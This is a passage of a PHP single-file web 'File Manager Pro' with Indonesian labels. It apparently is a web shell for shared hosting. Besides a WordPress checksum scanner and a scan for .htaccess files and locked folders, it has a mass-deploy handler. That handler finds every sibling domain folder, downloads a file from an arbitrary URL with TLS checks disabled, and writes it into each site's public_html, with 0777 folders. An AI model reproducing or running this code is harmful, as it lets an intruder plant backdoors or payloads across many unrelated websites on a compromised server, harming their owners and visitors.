  .tbl{width:100%;border-collapse:separate;border-spacing:0;margin:8px 0 4px;border:1px solid var(--line);border-radius:10px;overflow:hidden}
  .tbl thead th{background:#0a0f1d;color:#aab8d6;text-align:left;font-weight:600;font-size:12px;padding:10px;border-bottom:1px solid var(--line)}
  .tbl tbody td{padding:10px;border-bottom:1px solid var(--line)}
  .tbl tbody tr:nth-child(odd){background:#0b1020}
  .tbl code{color:#cfe4ff}
  .empty{color:var(--muted);background:#0b1020;border:1px dashed var(--line);padding:10px;border-radius:8px}
  .empty.error{color:#ffd1d1;border-color:#412; background:#1b0e10}
  .sep{border:0;border-top:1px solid var(--line);margin:14px 0}
  .badge{display:inline-block;padding:2px 6px;border-radius:999px;font-size:12px;border:1px solid var(--line)}
  .badge-warn{background:#241c00;color:#ffd36e;border-color:#5a4300}
  footer{color:var(--muted);margin-top:14px;text-align:center;font-size:12px}
</style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>Laporan Scan File Manager</h1>
      <div>Dibuat: {$now}</div>
    </div>

    <!-- SECTIONS -->
    {{SECTIONS}}

    <footer>Generated by File Manager</footer>
  </div>
</body>
</html>
HTML;

    $html = str_replace('{{SECTIONS}}', implode("\n\n", $sections), $html);
    file_put_contents($scanFile, $html);
    $_SESSION['scan_result_file'] = $scanFile;

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === CORE SCAN HELPERS (WordPress checksums) ===
function http_get_json_assoc($url, $timeout = 12) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => $timeout,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_USERAGENT => 'fm-core-scan/1.0 (+checksum)',
        ]);
        $res = curl_exec($ch);
        if ($res === false) {
            $err = curl_error($ch);
            curl_close($ch);
            throw new RuntimeException("HTTP (cURL) gagal: $err");
        }
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($code < 200 || $code >= 300) throw new RuntimeException("HTTP $code");
        $data = json_decode($res, true);
        if (!is_array($data)) throw new RuntimeException("JSON tidak valid.");
        return $data;
    }
    $ctx = stream_context_create([
        'http' => ['timeout' => $timeout, 'header' => "User-Agent: fm-core-scan/1.0\r\n"]
    ]);
    $res = @file_get_contents($url, false, $ctx);
    if ($res === false) throw new RuntimeException("HTTP gagal (file_get_contents).");
    $data = json_decode($res, true);
    if (!is_array($data)) throw new RuntimeException("JSON tidak valid.");
    return $data;
}

function wp_detect_version_locale_from_root($root) {
    @include_once rtrim($root, '/').'/wp-load.php';

    $version = null;
    if (isset($GLOBALS['wp_version']) && is_string($GLOBALS['wp_version'])) {
        $version = $GLOBALS['wp_version'];
    } else {
        $vf = rtrim($root, '/').'/wp-includes/version.php';
        if (is_file($vf)) {
            $src = @file_get_contents($vf);
            if ($src !== false && preg_match("/\\$wp_version\\s*=\\s*'([^']+)'/m", $src, $m)) {
                $version = $m[1];
            }
        }
    }

    $locale = null;
    if (function_exists('get_locale')) $locale = @get_locale();
    if (!$locale) {
        $wpc = rtrim($root, '/').'/wp-config.php';
        if (is_file($wpc)) {
            $src = @file_get_contents($wpc);
            if ($src !== false && preg_match('/define\\(\\s*[\'"]WPLANG[\'"]\\s*,\\s*[\'"]([^\'"]+)[\'"]\\s*\\)/', $src, $m)) {
                $locale = $m[1];
            }
        }
    }
    if (!$locale) $locale = 'en_US';

    return [$version, $locale];
}

function wp_fetch_checksums($version, $locale) {
    $api = "https://api.wordpress.org/core/checksums/1.0/?version=" . rawurlencode($version) .
           "&locale=" . rawurlencode($locale);
    $data = http_get_json_assoc($api);
    if (!isset($data['checksums']) || !is_array($data['checksums'])) {
        throw new RuntimeException('Format checksums dari API tidak valid.');
    }
    return $data['checksums'];
}

function scan_core_subdir($root, $subdir, $versionOpt = null, $localeOpt = null) {
    $root = rtrim($root, DIRECTORY_SEPARATOR);
    $target = $root . DIRECTORY_SEPARATOR . $subdir;

    if (!is_dir($target)) {
        throw new RuntimeException("Folder target tidak ditemukan: {$subdir}");
    }

    list($detectedVersion, $detectedLocale) = wp_detect_version_locale_from_root($root);
    $version = $versionOpt ?: $detectedVersion;
    $locale  = $localeOpt  ?: $detectedLocale;
    if (!$version) throw new RuntimeException("Tidak bisa deteksi versi WordPress. Isi versi manual.");

    $checksums = wp_fetch_checksums($version, $locale);

    $core_map = [];
    foreach ($checksums as $rel => $md5) {
        $rel_norm = str_replace('\\', '/', $rel);
        if (strpos($rel_norm, $subdir . '/') === 0) {
            $core_map[$rel_norm] = strtolower($md5);
        }
    }

    $unknown = [];
    $modified = [];
    $okcount = 0;
    $unreadableDirs = [];
    $unreadableFiles = [];

    $flags = FilesystemIterator::SKIP_DOTS;
    $rdi = new RecursiveDirectoryIterator($target, $flags);
    $rii = new RecursiveIteratorIterator($rdi, RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD);

    foreach ($rii as $fileInfo) {
        /** @var SplFileInfo $fileInfo */
        $abs = $fileInfo->getPathname();

        if ($fileInfo->isDir()) {
            if (!@is_readable($abs)) {
                $relDir = str_replace($root . DIRECTORY_SEPARATOR, '', $abs);
                $relDir = str_replace(DIRECTORY_SEPARATOR, '/', $relDir);
                $unreadableDirs[$relDir] = true;
            }
            continue;
        }
        if (!$fileInfo->isFile()) continue;

        if (!@is_readable($abs)) {
            $relF = str_replace($root . DIRECTORY_SEPARATOR, '', $abs);
            $relF = str_replace(DIRECTORY_SEPARATOR, '/', $relF);
            $unreadableFiles[$relF] = true;
            continue;
        }

        $rel = str_replace($root . DIRECTORY_SEPARATOR, '', $abs);
        $rel = str_replace(DIRECTORY_SEPARATOR, '/', $rel);

        if (!isset($core_map[$rel])) {
            $unknown[] = [
                'path' => $rel,
                'size' => (int)$fileInfo->getSize(),
                'mtime'=> (int)$fileInfo->getMTime(),
                'hash' => @md5_file($abs) ?: '',
            ];
            continue;
        }

        $md5 = @md5_file($abs);
        if (!$md5 || strtolower($md5) !== $core_map[$rel]) {
            $modified[] = [
                'path' => $rel,
                'size' => (int)$fileInfo->getSize(),
                'mtime'=> (int)$fileInfo->getMTime(),
                'hash' => $md5 ?: '',
                'expected' => $core_map[$rel],
            ];
        } else {
            $okcount++;
        }
    }

    $byPath = function($a, $b) { return strcmp($a['path'], $b['path']); };
    usort($unknown, $byPath);
    usort($modified, $byPath);
    ksort($unreadableDirs);
    ksort($unreadableFiles);

    return [
        'version' => $version,
        'locale'  => $locale,
        'subdir'  => $subdir,
        'okcount' => $okcount,
        'unknown' => $unknown,
        'modified'=> $modified,
        'unreadableDirs'  => array_keys($unreadableDirs),
        'unreadableFiles' => array_keys($unreadableFiles),
    ];
}

function format_htaccess_locked_html($root, array $htaccessList, array $lockedList) {
    ob_start(); ?>
    <section class="report-section">
      <h2>Scan: .htaccess &amp; Folder Locked</h2>
      <div class="section-desc">Root: <code><?= htmlspecialchars($root) ?></code></div>

      <?php if (count($htaccessList)): ?>
        <h3>.htaccess ditemukan (<?= (int)count($htaccessList) ?>)</h3>
        <table class="tbl">
          <thead><tr><th>#</th><th>Lokasi</th></tr></thead>
          <tbody>
          <?php foreach ($htaccessList as $i => $p): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($p) ?></code></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada file <code>.htaccess</code> yang terdeteksi.</div>
      <?php endif; ?>

      <hr class="sep">

      <?php if (count($lockedList)): ?>
        <h3>Folder terkunci CHMOD (<?= (int)count($lockedList) ?>)</h3>
        <table class="tbl">
          <thead><tr><th>#</th><th>Folder</th><th>Permission</th></tr></thead>
          <tbody>
          <?php foreach ($lockedList as $i => $row): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($row['path']) ?></code></td>
              <td><span class="badge badge-warn"><?= htmlspecialchars($row['perm']) ?></span></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada folder yang terdeteksi dalam kondisi terkunci.</div>
      <?php endif; ?>
    </section>
    <?php
    return ob_get_clean();
}

function format_core_scan_html_report(array $scan) {
    ob_start(); ?>
    <section class="report-section">
      <h2>Core Scan: <?= htmlspecialchars(strtoupper($scan['subdir'])) ?></h2>
      <div class="grid-cards">
        <div class="card stat"><div class="k">WP Version</div><div class="v"><?= htmlspecialchars($scan['version']) ?></div></div>
        <div class="card stat"><div class="k">Locale</div><div class="v"><?= htmlspecialchars($scan['locale']) ?></div></div>
        <div class="card stat ok"><div class="k">Cocok checksum</div><div class="v"><?= (int)$scan['okcount'] ?></div></div>
        <div class="card stat warn"><div class="k">Core berubah</div><div class="v"><?= (int)count($scan['modified']) ?></div></div>
        <div class="card stat info"><div class="k">Non-core</div><div class="v"><?= (int)count($scan['unknown']) ?></div></div>
      </div>

      <?php if (!empty($scan['unreadableDirs'])): ?>
        <h3>Folder tak terbaca</h3>
        <ul class="list-simple">
          <?php foreach ($scan['unreadableDirs'] as $d): ?>
            <li><code><?= htmlspecialchars($d) ?></code></li>
          <?php endforeach; ?>
        </ul>
      <?php endif; ?>

      <?php if (!empty($scan['unreadableFiles'])): ?>
        <h3>File tak terbaca</h3>
        <ul class="list-simple">
          <?php foreach ($scan['unreadableFiles'] as $f): ?>
            <li><code><?= htmlspecialchars($f) ?></code></li>
          <?php endforeach; ?>
        </ul>
      <?php endif; ?>

      <hr class="sep">

      <h3>Non-core (bukan bagian dari core resmi)</h3>
      <?php if (!empty($scan['unknown'])): ?>
        <table class="tbl">
          <thead><tr><th>#</th><th>Path</th><th>Size</th><th>Modified</th></tr></thead>
          <tbody>
          <?php foreach ($scan['unknown'] as $i => $u): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($u['path']) ?></code></td>
              <td><?= number_format((int)$u['size']) ?> B</td>
              <td><?= $u['mtime'] ? htmlspecialchars(date('Y-m-d H:i:s', (int)$u['mtime'])) : '—' ?></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada file non-core.</div>
      <?php endif; ?>

      <hr class="sep">

      <h3>Core berubah (checksum mismatch)</h3>
      <?php if (!empty($scan['modified'])): ?>
        <table class="tbl">
          <thead><tr><th>#</th><th>Path</th><th>Size</th><th>Modified</th><th>Keterangan</th></tr></thead>
          <tbody>
          <?php foreach ($scan['modified'] as $i => $m): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($m['path']) ?></code></td>
              <td><?= number_format((int)$m['size']) ?> B</td>
              <td><?= $m['mtime'] ? htmlspecialchars(date('Y-m-d H:i:s', (int)$m['mtime'])) : '—' ?></td>
              <td><span class="badge badge-warn">Berbeda dari core resmi</span></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada file core yang berubah.</div>
      <?php endif; ?>
    </section>
    <?php
    return ob_get_clean();
}

// ==================== DEPLOY FILE KE SUBDOMAIN ====================
// Fungsi scan folder domain/subdomain (dengan pengecualian folder sistem)
function fm_collect_domain_targets(&$list, &$errors) {
    $list = [];
    $errors = [];

    $docRoot = @realpath($_SERVER['DOCUMENT_ROOT']);
    if (!$docRoot) $docRoot = $_SERVER['DOCUMENT_ROOT'];
    $docRoot = rtrim($docRoot, DIRECTORY_SEPARATOR);

    $roots = [];

    // 1) Di dalam public_html (Document Root)
    if ($docRoot && is_dir($docRoot)) {
        $roots[] = $docRoot;
    }

    $parent     = dirname($docRoot);
    $parentReal = $parent ? (@realpath($parent) ?: $parent) : null;

    if ($parentReal && $parentReal !== $docRoot && is_dir($parentReal)) {
        $roots[] = $parentReal;
    }

    // Pola DirectAdmin: .../domains/domain.com/public_html
    $pattern = DIRECTORY_SEPARATOR . 'domains' . DIRECTORY_SEPARATOR;
    $pos = strpos($docRoot, $pattern);
    if ($pos !== false) {
        $domainsRoot = substr($docRoot, 0, $pos + strlen($pattern));
        $domainsRoot = rtrim($domainsRoot, DIRECTORY_SEPARATOR);
        if ($domainsRoot && is_dir($domainsRoot)) {
            $roots[] = $domainsRoot;
        }
    }

    $roots = array_values(array_unique($roots));

    $maxDepth = 3;
    $maxFound = 200;
    $skipNames = [
        '.', '..',
        '.git', '.svn',
        'node_modules', 'vendor',
        'logs', 'log',
        'tmp', 'cache',
        'wp-content', 'wp-admin', 'wp-includes'
    ];

    // Folder-folder sistem yang TIDAK mau kita scan (cPanel dll)
    $excludeHome = [
        'etc','logs','mail','tmp','ssl','access-logs','public_ftp','backup','backups',
        '.cpanel','.htpasswds','.trash','.config','.softaculous','.softaculous_backups',
        '.subaccounts','.ssh','.cl.selector','.cagefs','.pki','.local','.wp-cli','.wp-toolkit', '.caldav'
    ];

    $added = [];

    foreach ($roots as $root) {
        $rootReal = @realpath($root);
        if (!$rootReal || !is_dir($rootReal)) continue;
        if ($rootReal === DIRECTORY_SEPARATOR) continue;

        $isHomeRoot = ($parentReal && $rootReal === $parentReal);

        $queue = [[$rootReal, 0]];

        while (!empty($queue)) {
            [$dir, $depth] = array_shift($queue);

            if (!@is_readable($dir)) continue;

            try {
                $it = new DirectoryIterator($dir);
            } catch (Exception $e) {
                continue;
            }

            foreach ($it as $entry) {
                if ($entry->isDot()) continue;
                if (!$entry->isDir()) continue;

                $name = $entry->getFilename();

                if (in_array($name, $skipNames, true)) continue;

                if ($isHomeRoot && $depth === 0 && in_array($name, $excludeHome, true)) {
                    continue;
                }

                $full = $entry->getPathname();

                if (strpos($name, '.') !== false && $name[0] !== '.') {
                    // Filter 1: Abaikan jika nama folder mengandung angka versi (misal 1.2.3)
                    if (preg_match('/\d+\.\d+(\.\d+)?/', $name)) {
                        continue;
                    }
                    // Filter 2: Abaikan jika nama folder mengandung kata-kata umum folder proyek
                    $skipWords = ['bower_components', 'node_modules', 'vendor', 'dist', 'build', 'src', 'lib', 'plugins', 'MathJax', 'socket.io', 'datatables', 'ion', 'jquery', 'ui'];
                    foreach ($skipWords as $word) {
                        if (stripos($name, $word) !== false) {
                            continue 2; // skip folder ini dan lanjut ke iterasi berikutnya
                        }
                    }
                    // Filter 3: Abaikan jika nama folder tidak mirip domain (hanya huruf, angka, titik, hubung)
                    if (!preg_match('/^[a-zA-Z0-9.-]+$/', $name)) {
                        continue;
                    }
                    // Filter 4: Abaikan jika setelah titik terakhir bukan TLD yang valid (2-6 huruf)
                    $parts = explode('.', $name);
                    $last = strtolower(end($parts));
                    if (!preg_match('/^[a-z]{2,6}$/', $last)) {
                        continue;
                    }

                    $publicHtml = $full . DIRECTORY_SEPARATOR . 'public_html';
                    $target     = is_dir($publicHtml) ? $publicHtml : $full;

                    $key = @realpath($target) ?: $target;
                    if (!isset($added[$key])) {
                        $added[$key] = 1;

                        $display = $key;
                        if (strpos($key, $rootReal) === 0) {
                            $rel = substr($key, strlen($rootReal));
                            $display = $rel === '' ? $key : $rel;
                        }

                        $list[] = [
                            'label'     => $name,
                            'target'    => $target,
                            'display'   => $display,
                            'from_root' => $rootReal,
                        ];

                        if (count($list) >= $maxFound) {
                            $errors[] = "Hasil scan dibatasi {$maxFound} folder. Ditampilkan sebagian saja.";
                            return true;
                        }
                    }
                }

                if ($depth + 1 <= $maxDepth) {
                    $queue[] = [$full, $depth + 1];
                }
            }
        }
    }

    if (empty($list)) {
        $errors[] = 'Tidak ada folder yang tampak seperti domain/subdomain di sekitar Document Root.';
        return false;
    }

    return true;
}

// Fungsi download file ke temp
function fm_download_remote_file_simple($url, &$tmpFile, &$err)
{
    $err = '';
    $tmpFile = tempnam(sys_get_temp_dir(), 'deploy_file_');
    if ($tmpFile === false) {
        $err = 'Gagal membuat file sementara.';
        return false;
    }

    if (function_exists('curl_init')) {
        $fp = @fopen($tmpFile, 'w');
        if (!$fp) {
            $err = 'Gagal membuka file sementara untuk ditulis.';
            return false;
        }

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_FILE           => $fp,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 60,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT      => 'DeployFileBot/1.0',
        ]);

        curl_exec($ch);
        if (curl_errno($ch)) {
            $err = 'cURL error: ' . curl_error($ch);
            fclose($fp);
            curl_close($ch);
            @unlink($tmpFile);
            return false;
        }

        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        fclose($fp);

        if ($httpCode < 200 || $httpCode >= 300) {
            $err = 'HTTP status tidak OK: ' . $httpCode;
            @unlink($tmpFile);
            return false;
        }
    } else {
        $context = stream_context_create([
            'http' => [
                'method'  => 'GET',
                'timeout' => 60,
            ],
            'ssl'  => [
                'verify_peer'      => false,
                'verify_peer_name' => false,
            ],
        ]);

        $data = @file_get_contents($url, false, $context);
        if ($data === false) {
            $err = 'Gagal membaca konten file (file_get_contents).';
            @unlink($tmpFile);
            return false;
        }

        if (@file_put_contents($tmpFile, $data) === false) {
            $err = 'Gagal menulis ke file sementara.';
            @unlink($tmpFile);
            return false;
        }
    }

    $size = @filesize($tmpFile);
    if ($size === false || $size == 0) {
        $err = 'File yang di-download berukuran 0 byte. URL mungkin tidak dapat diakses dari server.';
        @unlink($tmpFile);
        return false;
    }

    return true;
}

// Handler scan domain/subdomain
if (isset($_POST['deployScanDomains'])) {
    // Scan hanya membaca, semua role bisa
    $items = [];
    $errs  = [];
    if (fm_collect_domain_targets($items, $errs)) {
        $_SESSION['deploy_scan_items']   = $items;
        $_SESSION['deploy_scan_message'] = 'Scan folder domain/subdomain selesai. Ditemukan ' . count($items) . ' target.';
    } else {
        $_SESSION['deploy_scan_items']   = [];
        $_SESSION['deploy_scan_message'] = implode(' | ', $errs);
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// Handler reset
if (isset($_POST['deployReset'])) {
    // Reset hanya session, semua role bisa
    unset(
        $_SESSION['deploy_scan_items'],
        $_SESSION['deploy_scan_message'],
        $_SESSION['deploy_file_status'],
        $_SESSION['deploy_file_message']
    );
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// Handler deploy file
if (isset($_POST['deployRunFile'])) {
    // Hanya admin yang boleh menulis file ke domain lain
    if (!$isAdmin) {
        $_SESSION['error'] = 'Hanya admin yang dapat melakukan deploy file.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $fileUrl      = isset($_POST['deploy_file_url']) ? trim($_POST['deploy_file_url']) : '';
    $subpath      = isset($_POST['deploy_file_path']) ? trim($_POST['deploy_file_path']) : '';
    $customName   = isset($_POST['deploy_file_name']) ? trim($_POST['deploy_file_name']) : '';
    $selected     = isset($_POST['deploy_file_targets']) && is_array($_POST['deploy_file_targets'])
        ? $_POST['deploy_file_targets']
        : [];

    $items  = isset($_SESSION['deploy_scan_items']) && is_array($_SESSION['deploy_scan_items'])
        ? $_SESSION['deploy_scan_items']
        : [];

    $errors      = [];
    $okPaths     = [];
    $serverPaths = [];

    if ($fileUrl === '' || !filter_var($fileUrl, FILTER_VALIDATE_URL)) {
        $errors[] = 'URL file tidak valid.';
    }
    if (empty($selected)) {
        $errors[] = 'Pilih minimal satu folder domain/subdomain.';
    }

    if (!$errors) {
        $subpathSafe = sanitizePath($subpath);
        $subpathSafe = trim($subpathSafe);

        $basename = basename(parse_url($fileUrl, PHP_URL_PATH) ?: '');
        $filename = $customName !== '' ? sanitizePath($customName) : sanitizePath($basename);
        if ($filename === '') $filename = 'downloaded_file';
        $filename = preg_replace('~[\\\\/]+~', '', $filename);

        $tempFile = '';
        if (!fm_download_remote_file_simple($fileUrl, $tempFile, $err)) {
            $errors[] = 'Gagal mendownload file: ' . $err;
        } else {
            $sizeTemp = @filesize($tempFile);
            if ($sizeTemp === false || $sizeTemp == 0) {
                $errors[] = 'File hasil download 0 byte. Cek URL atau akses server.';
                @unlink($tempFile);
            } else {
                foreach ($selected as $idxRaw) {
                    $idx = (int) $idxRaw;
                    if (!isset($items[$idx])) continue;

                    $info  = $items[$idx];
                    $base  = isset($info['target']) ? $info['target'] : '';
                    $label = isset($info['label']) ? $info['label'] : ('Target '.$idx);

                    if (!$base || !is_dir($base)) {
                        $errors[] = 'Base path tidak ditemukan: ' . $base;
                        continue;
                    }

                    $destDir = rtrim($base, '/');
                    if ($subpathSafe !== '' && $subpathSafe !== '/') {
                        $destDir .= '/' . ltrim($subpathSafe, '/');
                    }

                    if (!is_dir($destDir)) {
                        @mkdir($destDir, 0777, true);
                    }
                    if (!is_dir($destDir)) {
                        $errors[] = 'Gagal membuat folder tujuan: ' . $destDir;
                        continue;
                    }

                    $destFile = rtrim($destDir, '/') . '/' . $filename;

                    if (!@copy($tempFile, $destFile)) {
                        $errors[] = 'Gagal menyimpan file ke: ' . $destFile;
                        continue;
                    }

                    $friendly = $label;
                    if ($subpathSafe !== '' && $subpathSafe !== '/') {
                        $friendly .= '/' . ltrim($subpathSafe, '/');
                    }
                    $friendly .= '/' . $filename;

                    $okPaths[]     = $friendly;
                    $serverPaths[] = $destFile;
                }

                @unlink($tempFile);
            }
        }
    }

    if (!empty($okPaths)) {
        $status = empty($errors) ? 'success' : 'partial';

        $msg  = "Deploy FILE selesai.\n";
        $msg .= "Sumber file : {$fileUrl}\n";
        $msg .= "Nama file   : {$filename}\n";
        $msg .= "Target URL path (domain + subpath + nama file):\n - " . implode("\n - ", $okPaths);
        if (!empty($serverPaths)) {
            $msg .= "\n\nPath file di server:\n - " . implode("\n - ", $serverPaths);
        }
        if (!empty($errors)) {
            $msg .= "\n\nCatatan:\n - " . implode("\n - ", $errors);
        }

        $_SESSION['deploy_file_status']  = $status;
        $_SESSION['deploy_file_message'] = nl2br(htmlspecialchars($msg));
    } else {
        $_SESSION['deploy_file_status']  = 'error';
        $_SESSION['deploy_file_message'] = !empty($errors)
            ? htmlspecialchars(implode(' | ', $errors))
            : 'Deploy FILE gagal. Tidak ada target yang berhasil.';
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// =====================================================================
// BAGIAN 6: UI MODERN (HTML + CSS + JS) – TERMINAL TELAH DIHAPUS
// =====================================================================

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager Pro</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.js"></script>
    <!-- tambahkan mode sesuai kebutuhan, misal mode untuk PHP, HTML, dll -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/htmlmixed/htmlmixed.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/clike/clike.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/php/php.min.js"></script>
    <style>
        /* ===== RESET & VARIABLES ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-primary: #0f172a;
            --bg-secondary: #1e293b;
            --bg-tertiary: #334155;
            --accent: #3b82f6;
            --accent-hover: #2563eb;
            --text: #f1f5f9;
            --text-muted: #94a3b8;
            --border: #334155;
            --danger: #ef4444;
            --success: #10b981;
            --warning: #f59e0b;
            --info: #3b82f6;
            --card-bg: #1e293b;
            --sidebar-width: 280px;
            --header-height: 60px;
        }

        body {
            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--bg-primary);
            color: var(--text);
            line-height: 1.5;
            font-size: 14px;
            height: 100vh;
            overflow: hidden;
        }

        /* ===== LAYOUT ===== */
        .file-checkbox {
            width: 2rem;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .file-manager {
            display: flex;
            height: 100vh;
        }

        .sidebar {
            width: var(--sidebar-width);
            background: var(--bg-secondary);
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            overflow-y: auto;
            padding: 1rem;
        }

        .main-content {
            flex: 1;
            overflow-y: auto;
            padding: 1rem;
        }

        /* ===== SCROLLBAR ===== */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        ::-webkit-scrollbar-track {
            background: var(--bg-primary);
        }
        ::-webkit-scrollbar-thumb {
            background: var(--bg-tertiary);
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: var(--accent);
        }

        /* ===== CARDS ===== */
        .card {
            background: var(--card-bg);
            border-radius: 0.75rem;
            border: 1px solid var(--border);
            padding: 1rem;
            margin-bottom: 1rem;
        }

        .card h3 {
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            color: var(--text-muted);
            margin-bottom: 0.75rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .card h3 i {
            color: var(--accent);
            font-size: 1rem;
        }

        /* ===== FORM ELEMENTS ===== */
        input, select, textarea {
            background: var(--bg-primary);
            border: 1px solid var(--border);
            color: var(--text);
            border-radius: 0.5rem;
            padding: 0.5rem 0.75rem;
            font-size: 0.85rem;
            width: 100%;
            margin-bottom: 0.5rem;
            transition: border-color 0.2s;
        }

        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 2px rgba(59,130,246,0.3);
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            padding: 0.5rem 1rem;
            border-radius: 0.5rem;
            font-weight: 500;
            border: none;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 0.85rem;
            background: var(--bg-tertiary);
            color: var(--text);
        }

        .btn:hover {
            background: var(--accent);
            color: white;
        }

        .btn-primary {
            background: var(--accent);
            color: white;
        }

        .btn-primary:hover {
            background: var(--accent-hover);
        }

        .btn-danger {
            background: var(--danger);
            color: white;
        }

        .btn-danger:hover {
            background: #dc2626;
        }

        .btn-success {
            background: var(--success);
            color: white;
        }

        .btn-warning {
            background: var(--warning);
            color: black;
        }

        .btn-sm {
            padding: 0.25rem 0.5rem;
            font-size: 0.75rem;
        }

        /* ===== FILE LIST ===== */
        .file-list {
            margin-top: 1rem;
        }

        .file-item {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.5rem;
            border-bottom: 1px solid var(--border);
            transition: background 0.2s;
        }

        .file-item:hover {
            background: var(--bg-secondary);
        }

        .file-item.danger {
            border-left: 3px solid var(--danger);
        }
        .file-item.warning {
            border-left: 3px solid var(--warning);
        }
        .file-item.success {
            border-left: 3px solid var(--success);
        }

        .file-icon {
            font-size: 1.2rem;
            width: 2rem;
            text-align: center;
            color: var(--text-muted);
        }

        .file-name {
            flex: 1;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            font-weight: 500;
        }

        .file-name a {
            color: var(--text);
            text-decoration: none;
        }

        .file-name a:hover {
            color: var(--accent);
        }

        .file-actions {
            display: flex;
            gap: 0.25rem;
            flex-wrap: wrap;
            justify-content: flex-end;
        }

        .file-actions .btn {
            padding: 0.25rem 0.5rem;
            font-size: 0.75rem;
        }

        .file-size, .file-perm, .file-date {
            font-size: 0.75rem;
            color: var(--text-muted);
            min-width: 60px;
            text-align: right;
        }

        /* ===== BREADCRUMB ===== */
        .breadcrumb {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            margin-bottom: 1rem;
            background: var(--bg-secondary);
            padding: 0.5rem 1rem;
            border-radius: 0.75rem;
            border: 1px solid var(--border);
        }

        .breadcrumb a {
            color: var(--text-muted);
            text-decoration: none;
            font-size: 0.85rem;
        }

        .breadcrumb a:hover {
            color: var(--accent);
        }

        .breadcrumb .separator {
            color: var(--text-muted);
        }

        .breadcrumb .current {
            color: var(--text);
            font-weight: 500;
        }

        /* ===== PAGINATION ===== */
        .pagination {
            display: flex;
            gap: 0.25rem;
            margin-top: 1rem;
            justify-content: center;
        }

        .pagination .page-link {
            padding: 0.25rem 0.75rem;
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 0.25rem;
            color: var(--text);
            text-decoration: none;
            font-size: 0.85rem;
        }

        .pagination .page-link:hover {
            background: var(--accent);
            border-color: var(--accent);
        }

        .pagination .page-link.disabled {
            opacity: 0.5;
            pointer-events: none;
        }

        /* ===== ALERTS ===== */
        .alert {
            padding: 0.75rem 1rem;
            border-radius: 0.5rem;
            margin-bottom: 1rem;
            font-size: 0.85rem;
        }

        .alert.success {
            background: rgba(16,185,129,0.2);
            border: 1px solid var(--success);
            color: var(--success);
        }

        .alert.error {
            background: rgba(239,68,68,0.2);
            border: 1px solid var(--danger);
            color: var(--danger);
        }

        .alert.warning {
            background: rgba(245,158,11,0.2);
            border: 1px solid var(--warning);
            color: var(--warning);
        }

        /* ===== MODAL ===== */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            align-items: center;
            justify-content: center;
